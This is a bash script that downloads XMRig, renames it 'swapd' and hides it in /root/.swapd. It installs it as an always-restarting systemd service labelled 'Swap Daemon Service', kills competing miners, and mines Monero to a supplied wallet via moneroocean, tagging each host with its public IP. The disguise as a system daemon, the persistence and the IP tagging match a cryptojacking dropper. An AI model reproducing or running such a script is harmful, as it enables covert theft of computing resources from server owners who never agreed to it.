#!/bin/bash

# Standalone XMRig installer as 'swapd'
# Run this to complete the missing installation

WALLET="$1"
EMAIL="$2"

if [ -z "$WALLET" ]; then
  echo "Usage: $0 <WALLET_ADDRESS> [EMAIL]"
  echo "Example: $0 437YnP2yNsLYAiU9LTm1fuf8owjaMojbMPzMykkrF4Hi21yU7bSa5u4c4pdhx9HZBMTNEUq9YpqBkGghm1dcaYjYHs1bd5q"
  exit 1
fi

echo "[*] Starting XMRig installation as 'swapd'..."

# Stop and remove old service
echo "[*] Cleaning up old installation..."
systemctl stop swapd.service 2>/dev/null
killall -9 swapd 2>/dev/null
killall -9 xmrig 2>/dev/null
rm -rf /root/.swapd
rm -rf /tmp/xmrig*

# Create directory
echo "[*] Creating /root/.swapd directory..."
mkdir -p /root/.swapd

# Download latest XMRig
echo "[*] Downloading latest XMRig..."
cd /tmp || exit 1

LATEST_XMRIG_RELEASE=$(curl -s https://github.com/xmrig/xmrig/releases/latest | grep -o 'v[0-9]\+\.[0-9]\+\.[0-9]\+' | head -1)
LATEST_XMRIG_VERSION="${LATEST_XMRIG_RELEASE#v}"  # Strip 'v' prefix

echo "[*] Latest version: $LATEST_XMRIG_RELEASE (directory: $LATEST_XMRIG_VERSION)"

# Detect architecture
ARCH=$(uname -m)
if [ "$ARCH" == "aarch64" ] || [ "$ARCH" == "arm64" ]; then
    LATEST_XMRIG_LINUX_RELEASE="xmrig-$LATEST_XMRIG_RELEASE-linux-static-arm64.tar.gz"
    echo "[*] Detected ARM64 architecture"
else
    LATEST_XMRIG_LINUX_RELEASE="xmrig-$LATEST_XMRIG_RELEASE-linux-static-x64.tar.gz"
    echo "[*] Detected x64 architecture"
fi

# Download
echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE..."
if ! curl -L --progress-bar "https://github.com/xmrig/xmrig/releases/download/$LATEST_XMRIG_RELEASE/$LATEST_XMRIG_LINUX_RELEASE" -o /tmp/xmrig.tar.gz; then
    echo "[ERROR] Download failed!"
    exit 1
fi

# Extract
echo "[*] Extracting archive..."
tar xf /tmp/xmrig.tar.gz -C /tmp

# Verify extraction
echo "[*] Verifying extraction..."
if [ ! -d "/tmp/xmrig-$LATEST_XMRIG_VERSION" ]; then
    echo "[ERROR] Extracted directory not found!"
    echo "Looking for: /tmp/xmrig-$LATEST_XMRIG_VERSION"
    echo "Available in /tmp:"
    ls -la /tmp/ | grep xmrig
    exit 1
fi

# Move to destination
echo "[*] Moving to /root/.swapd..."
mv "/tmp/xmrig-$LATEST_XMRIG_VERSION"/* /root/.swapd/
rm -rf "/tmp/xmrig-$LATEST_XMRIG_VERSION"
rm -f /tmp/xmrig.tar.gz

# Rename binary
echo "[*] Renaming xmrig to swapd..."
if [ -f /root/.swapd/xmrig ]; then
    mv /root/.swapd/xmrig /root/.swapd/swapd
    chmod +x /root/.swapd/swapd
    echo "[✓] Binary renamed successfully"
else
    echo "[ERROR] xmrig binary not found in /root/.swapd/"
    ls -la /root/.swapd/
    exit 1
fi

# Create config.json
echo "[*] Creating config.json..."

# Get IP for password
PASS=$(curl -4 -s ip.sb 2>/dev/null)
if [ "$PASS" == "localhost" ] || [ -z "$PASS" ]; then
  PASS=$(ip route get 1 2>/dev/null | awk '{print $NF;exit}')
fi
if [ -z "$PASS" ]; then
  PASS="na"
fi
if [ -n "$EMAIL" ]; then
  PASS="$PASS:$EMAIL"
fi

cat >/root/.swapd/config.json <<EOL
{
    "autosave": true,
    "donate-level": 0,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "asm": true,
        "argon2-impl": null,
        "astrobwt-max-size": 550,
        "astrobwt-avx2": false,
        "cn/0": false,
        "cn-lite/0": false,
        "kawpow": false
    },
    "opencl": false,
    "cuda": false,
    "log-file": null,
    "pools": [
        {
            "coin": null,
            "algo": "rx/0",
            "url": "gulf.moneroocean.stream:20128",
            "user": "$WALLET",
            "pass": "$PASS",
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "retries": 5,
    "retry-pause": 5,
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "dns": {
        "ipv6": false,
        "ttl": 30
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
EOL

echo "[✓] Config created"

# Create swapd.sh launcher
cat >/root/.swapd/swapd.sh <<'EOL'
#!/bin/bash
cd /root/.swapd
./swapd --config=config.json
EOL
chmod +x /root/.swapd/swapd.sh

echo "[✓] Launcher script created"

# Create systemd service
echo "[*] Creating systemd service..."
cat >/tmp/swapd.service <<'EOL'
[Unit]
Description=Swap Daemon Service
After=network.target

[Service]
ExecStart=/root/.swapd/swapd --config=/root/.swapd/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL

mv /tmp/swapd.service /etc/systemd/system/swapd.service

# Test the binary first
echo ""
echo "[*] Testing binary..."
/root/.swapd/swapd --version
if [ $? -ne 0 ]; then
    echo "[ERROR] Binary test failed!"
    echo "Checking binary info:"
    file /root/.swapd/swapd
    ldd /root/.swapd/swapd
    exit 1
fi

# Apply optimizations
echo "[*] Applying system optimizations..."
sysctl -w vm.nr_hugepages=$(nproc) 2>/dev/null

for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d 2>/dev/null); do
    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages" 2>/dev/null
done

# Enable and start service
echo "[*] Enabling and starting service..."
systemctl daemon-reload
systemctl enable swapd.service
systemctl start swapd.service

sleep 2

echo ""
echo "========================================"
echo "[*] Installation complete!"
echo "========================================"
echo ""
echo "Service status:"
systemctl status swapd.service --no-pager
echo ""
echo "Checking processes:"
ps aux | grep -E "[s]wapd|[x]mrig"
echo ""
echo "Installation details:"
echo "  Directory: /root/.swapd/"
echo "  Binary: /root/.swapd/swapd"
echo "  Config: /root/.swapd/config.json"
echo "  Service: /etc/systemd/system/swapd.service"
echo ""
echo "Wallet: $WALLET"
echo "Pass: $PASS"
echo ""
